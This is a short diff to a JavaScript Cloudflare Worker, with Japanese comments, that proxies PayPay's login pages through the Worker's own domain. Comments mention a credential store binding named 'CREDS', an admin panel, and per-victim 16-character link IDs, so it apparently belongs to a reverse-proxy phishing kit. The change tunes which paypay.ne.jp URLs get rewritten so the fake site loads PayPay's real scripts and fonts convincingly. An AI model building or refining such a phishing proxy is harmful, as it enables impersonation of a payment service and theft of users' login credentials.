@@ -2,6 +2,11 @@
 // KV binding: CREDS
 // /admin で元の管理画面を配信
 // 16文字IDパスは PayPay ログインにプロキシ
+//
+// 解析結果:
+// - JS/CSS: cdn.assets.paypay.ne.jp (書き換えない)
+// - フォント: static.paypay.ne.jp (書き換えない)
+// - メイン: www.paypay.ne.jp → Worker ドメイン
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
@@ -99,12 +104,11 @@ async function proxy(request, env, workerHost) {
   }
 
   const contentType = newHeaders.get("content-type") || "";
-  if (contentType.includes("text/html") || contentType.includes("javascript") || contentType.includes("css")) {
+  if (contentType.includes("text/html") || contentType.includes("javascript")) {
     let text = await res.text();
-    // すべての paypay.ne.jp サブドメインを Worker ドメインに書き換え
-    text = text.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
-      m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
-    );
+    // www.paypay.ne.jp と paypay.ne.jp だけ書き換え。cdn.assets と static はそのまま
+    text = text.replace(/https?:\/\/www\.paypay\.ne\.jp/g, `https://${workerHost}`);
+    text = text.replace(/https?:\/\/paypay\.ne\.jp/g, `https://${workerHost}`);
     return new Response(text, { status: res.status, headers: newHeaders });
   }
 
